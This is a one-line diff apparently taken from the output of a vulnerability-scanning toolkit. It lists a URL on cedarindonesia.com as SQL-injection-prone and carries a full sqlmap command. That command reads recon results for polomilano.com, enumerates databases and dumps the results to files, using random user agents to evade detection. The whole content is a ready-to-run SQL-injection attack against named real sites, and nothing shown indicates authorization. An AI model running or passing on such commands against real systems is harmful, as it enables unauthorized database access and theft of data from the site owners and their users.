@@ -1,0 +1,1 @@
+https://cedarindonesia.com/?id=12&menu=services (GET)  # VulnScan/modules/sqlmap/sqlmap.py -m Result/polomilano.com/recon/polomilano.com_url/sqli_potential.txt -dbs --output-dir Result/polomilano.com/vuln/sqli-test --dump-file Result/polomilano.com/vuln/sqli-test/result --answer=Y --threads 10 --random-agent
